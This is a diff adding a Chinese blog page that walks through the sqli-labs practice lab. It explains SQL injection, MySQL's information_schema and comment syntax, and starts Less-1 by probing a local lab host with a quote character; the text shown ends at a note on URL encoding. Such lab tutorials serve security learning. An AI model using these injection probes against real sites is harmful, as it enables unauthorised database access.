@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="XsbHFAPEfGZwDkiouJz8Oi8U7_pVxMcGb14KhOFjDWc">
+  <meta name="msvalidate.01" content="147A6A17081B9D4CD8291B703C991D61">
+  <meta name="yandex-verification" content="2e6fb825297ac49f">
+  <meta name="baidu-site-verification" content="code-boR0c7DdL4">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.loli.net/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"vkali.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="sql注入是指web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的sql语句来实现对数据库的任意操作。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入靶场sqli-labs 1-10关通关教程">
+<meta property="og:url" content="https://vkali.com/archives/6ef1c9b9.html">
+<meta property="og:site_name" content="YinXin’s Blog">
+<meta property="og:description" content="sql注入是指web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的sql语句来实现对数据库的任意操作。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.1.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.2.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.3.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.4.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.5.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.6.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.7.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.9.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.10.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.11.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.12.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.1.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.2.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.3.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.4.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.5.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.6.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-9.1.png">
+<meta property="og:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-9.2.png">
+<meta property="article:published_time" content="2020-12-03T00:36:37.000Z">
+<meta property="article:modified_time" content="2021-04-25T05:34:18.902Z">
+<meta property="article:author" content="隐心">
+<meta property="article:tag" content="sql注入，sqli-labs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.1.png">
+
+
+<link rel="canonical" href="https://vkali.com/archives/6ef1c9b9.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://vkali.com/archives/6ef1c9b9.html","path":"archives/6ef1c9b9.html","title":"sql注入靶场sqli-labs 1-10关通关教程"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>sql注入靶场sqli-labs 1-10关通关教程 | YinXin’s Blog</title>
+  
+
+
+
+<link rel="dns-prefetch" href="https://vkali-api.vercel.app">
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">YinXin’s Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人生如逆旅，我亦是行人。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+        <li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a></li>
+        <li class="menu-item menu-item-bbs"><a href="https://devnetops.co/" rel="noopener" target="_blank"><i class="fa fa-anchor fa-fw"></i>网络自动化论坛</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-text">sql注入原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mysql%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-text">mysql相关知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#limit%E7%9A%84%E7%94%A8%E6%B3%95"><span class="nav-text">limit的用法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="nav-text">注释符</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-text"></span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-1"><span class="nav-text">Less-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E6%B3%A8%E5%85%A5"><span class="nav-text">开始注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E5%BA%93%E5%90%8D"><span class="nav-text">爆库名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D"><span class="nav-text">爆表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E8%A1%A8%E5%AD%97%E6%AE%B5"><span class="nav-text">爆表字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E8%A1%A8%E5%AD%97%E6%AE%B5%E7%9A%84%E5%86%85%E5%AE%B9"><span class="nav-text">爆表字段的内容</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-2"><span class="nav-text">Less-2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-3"><span class="nav-text">Less-3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-4"><span class="nav-text">Less-4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-5"><span class="nav-text">Less-5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-6"><span class="nav-text">Less-6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-7"><span class="nav-text">Less-7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-8"><span class="nav-text">Less-8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-9"><span class="nav-text">Less-9</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-10"><span class="nav-text">Less-10</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="隐心"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">隐心</p>
+  <div class="site-description" itemprop="description">生命的意义在于不停地折腾</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">71</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+<div style="">
+  <canvas id="canvas" style="width:60%;">当前浏览器不支持canvas，请更换浏览器后再试</canvas>
+</div>
+<script>
+(function(){
+
+   var digit=
+    [
+        [
+            [0,0,1,1,1,0,0],
+            [0,1,1,0,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,0,1,1,0],
+            [0,0,1,1,1,0,0]
+        ],//0
+        [
+            [0,0,0,1,1,0,0],
+            [0,1,1,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [1,1,1,1,1,1,1]
+        ],//1
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,0,0,0],
+            [0,1,1,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,0,0,0,1,1],
+            [1,1,1,1,1,1,1]
+        ],//2
+        [
+            [1,1,1,1,1,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//3
+        [
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,1,0],
+            [0,0,1,1,1,1,0],
+            [0,1,1,0,1,1,0],
+            [1,1,0,0,1,1,0],
+            [1,1,1,1,1,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,1,1]
+        ],//4
+        [
+            [1,1,1,1,1,1,1],
+            [1,1,0,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,1,1,1,1,0],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//5
+        [
+            [0,0,0,0,1,1,0],
+            [0,0,1,1,0,0,0],
+            [0,1,1,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,0,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//6
+        [
+            [1,1,1,1,1,1,1],
+            [1,1,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0]
+        ],//7
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//8
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,1,1,0,0,0,0]
+        ],//9
+        [
+            [0,0,0,0,0,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,0,0,0],
+            [0,0,0,0,0,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,0,0,0]
+        ]//:
+    ];
+
+var canvas = document.getElementById('canvas');
+
+if(canvas.getContext){
+    var cxt = canvas.getContext('2d');
+    //声明canvas的宽高
+    var H = 100,W = 700;
+    canvas.height = H;
+    canvas.width = W;
+    cxt.fillStyle = '#f00';
+    cxt.fillRect(10,10,50,50);
+
+    //存储时间数据
+    var data = [];
+    //存储运动的小球
+    var balls = [];
+    //设置粒子半径
+    var R = canvas.height/20-1;
+    (function(){
+        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());
+        //存储时间数字，由十位小时、个位小时、冒号、十位分钟、个位分钟、冒号、十位秒钟、个位秒钟这7个数字组成
+        data.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);
+    })();
+
+    /*生成点阵数字*/
+    function renderDigit(index,num){
+        for(var i = 0; i < digit[num].length; i++){
+            for(var j = 0; j < digit[num][i].length; j++){
+                if(digit[num][i][j] == 1){
+                    cxt.beginPath();
+                    cxt.arc(14*(R+2)*index + j*2*(R+1)+(R+1),i*2*(R+1)+(R+1),R,0,2*Math.PI);
+                    cxt.closePath();
+                    cxt.fill();
+                }
+            }
+        }
+    }
+
+    /*更新时钟*/
+    function updateDigitTime(){
+        var changeNumArray = [];
+        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());
+        var NewData = [];
+        NewData.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);
+        for(var i = data.length-1; i >=0 ; i--){
+            //时间发生变化
+            if(NewData[i] !== data[i]){
+                //将变化的数字值和在data数组中的索引存储在changeNumArray数组中
+                changeNumArray.push(i+'_'+(Number(data[i])+1)%10);
+            }
+        }
+        //增加小球
+        for(var i = 0; i< changeNumArray.length; i++){
+            addBalls.apply(this,changeNumArray[i].split('_'));
+        }
+        data = NewData.concat();
+    }
+
+    /*更新小球状态*/
+    function updateBalls(){
+        for(var i = 0; i < balls.length; i++){
+            balls[i].stepY += balls[i].disY;
+            balls[i].x += balls[i].stepX;
+            balls[i].y += balls[i].stepY;
+            if(balls[i].x > W + R || balls[i].y > H + R){
+                balls.splice(i,1);
+                i--;
+            }
+        }
+    }
+
+    /*增加要运动的小球*/
+    function addBalls(index,num){
+        var numArray = [1,2,3];
+        var colorArray =  ["#3BE","#09C","#A6C","#93C","#9C0","#690","#FB3","#F80","#F44","#C00"];
+        for(var i = 0; i < digit[num].length; i++){
+            for(var j = 0; j < digit[num][i].length; j++){
+                if(digit[num][i][j] == 1){
+                    var ball = {
+                        x:14*(R+2)*index + j*2*(R+1)+(R+1),
+                        y:i*2*(R+1)+(R+1),
+                        stepX:Math.floor(Math.random() * 4 -2),
+                        stepY:-2*numArray[Math.floor(Math.random()*numArray.length)],
+                        color:colorArray[Math.floor(Math.random()*colorArray.length)],
+                        disY:1
+                    };
+                    balls.push(ball);
+                }
+            }
+        }
+    }
+
+    /*渲染*/
+    function render(){
+        //重置画布宽度，达到清空画布的效果
+        canvas.height = 100;
+        //渲染时钟
+        for(var i = 0; i < data.length; i++){
+            renderDigit(i,data[i]);
+        }
+        //渲染小球
+        for(var i = 0; i < balls.length; i++){
+            cxt.beginPath();
+            cxt.arc(balls[i].x,balls[i].y,R,0,2*Math.PI);
+            cxt.fillStyle = balls[i].color;
+            cxt.closePath();
+            cxt.fill();
+        }
+    }
+
+    clearInterval(oTimer);
+    var oTimer = setInterval(function(){
+        //更新时钟
+        updateDigitTime();
+        //更新小球状态
+        updateBalls();
+        //渲染
+        render();
+    },50);
+}
+
+})();
+</script>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://vkali.com/archives/6ef1c9b9.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="隐心">
+      <meta itemprop="description" content="生命的意义在于不停地折腾">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YinXin’s Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql注入靶场sqli-labs 1-10关通关教程
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-12-03 08:36:37" itemprop="dateCreated datePublished" datetime="2020-12-03T08:36:37+08:00">2020-12-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2021-04-25 13:34:18" itemprop="dateModified" datetime="2021-04-25T13:34:18+08:00">2021-04-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">网络安全攻防</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/archives/6ef1c9b9.html#waline-comments" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" id="/archives/6ef1c9b9.html" data-xid="/archives/6ef1c9b9.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>sql注入是指web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的sql语句来实现对数据库的任意操作。</p>
+<span id="more"></span>
+<h1 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h1><p>sql注入漏洞的产生需要满足以下两个条件：</p>
+<ul>
+<li>参数用户可控：前端传给后端的参数内容是用户可控的。</li>
+<li>参数带入数据库查询：传入的参数拼接到sql语句，且带入数据库查询。</li>
+</ul>
+<p>当传入的ID参数为1’时，数据库执行的代码如下表示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id =1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这不符合数据库语法规范，所以会报错。当传入的ID参数为and 1=1时，执行的sql语句如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1 and 1=1</span><br></pre></td></tr></table></figure>
+
+<p>因为1=1为真，且where语句中id=1也为真，所以页面会返回与id=1相同的结果。当传入的ID参数为and 1=2不成立，所以返回假，页面就会返回与id=1不同的结果。<br>由此可以初步判断ID参数存在sql注入漏洞，攻击者可以进一步拼接sql语句进行攻击，导致数据库信息泄露，甚至进一步获取服务器权限等。</p>
+<h1 id="mysql相关知识点"><a href="#mysql相关知识点" class="headerlink" title="mysql相关知识点"></a>mysql相关知识点</h1><p>在mysql5.0版本之后，mysql默认在数据库中存放一个‘information——schema’的数据库，在该数据库中分别有三个表：SCHEMATA、TABLES、COLUMNS。</p>
+<ul>
+<li>SCHEMATA表: 储存该用户创建的所有数据库的库名。记录数据库库名的表字段为SCHEMA_NAME</li>
+<li>TABLES表：表示该用户创建的所有数据库的库名和表名，该表记录数据库库名和表名的字段分别为TABLE_SCHEMA和TABLE_NAME。</li>
+<li>COLUMNS表：储存该用户创建的所有数据库的库名、表名、字段名，该表记录数据库库名、表名和字段名的字段名为TABLE_SCHEMA、TABLE_NAME和COLUMN_NAME。</li>
+</ul>
+<h2 id="limit的用法"><a href="#limit的用法" class="headerlink" title="limit的用法"></a>limit的用法</h2><p>limit的使用格式为limit m,n,其中m是指记录开始的位置，从0开始，表示第一条记录：n是指取n条记录。例如limit 0,1表示从第一条记录开始，取一条记录。</p>
+<h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><p>在mysql中，常见注释符的表达方式：</p>
+<ul>
+<li><h1 id=""><a href="#" class="headerlink" title=""></a></h1></li>
+<li>–空格</li>
+<li>/**/</li>
+</ul>
+<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>看提示为字符型注入，分别尝试<code>?id=1</code>、<code>?id=1</code>‘、<code>?id=1&quot;</code>添加到url中，发现<code>?id=1&#39;</code>报错，说明是字符型注入而且是单引号注入。<br>我们可以在<a target="_blank" rel="noopener" href="http://192.168.150.16/Less-1/%E5%90%8E%E9%9D%A2%E7%9B%B4%E6%8E%A5%E6%B7%BB%E5%8A%A0%60?id=1&#39;%60%EF%BC%8C%E7%BB%93%E6%9E%9C%E5%A6%82%E4%B8%8B%E5%9B%BE%EF%BC%9A">http://192.168.150.16/Less-1/后面直接添加`?id=1&#39;`，结果如下图：</a><br><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.1.png"><br>从上面的错误当中，可以看到提交到sql中的<code>1&#39;</code>在经过sql语句构造后形成<code>&#39;1&#39;&#39; LIMIT 0,1</code>,多加了一个<code>&#39;</code>。这种方式就是从错误信息中得到需要的信息，接下来就是去掉多余的<code>&#39;</code>。</p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>在url中空格和一些特殊字符会进行url编码，例如：</p>
+<ul>
+<li>#：%23</li>
+<li>空格：%20</li>
+<li>‘：%27</li>
+<li>+：空格</li>
+</ul>
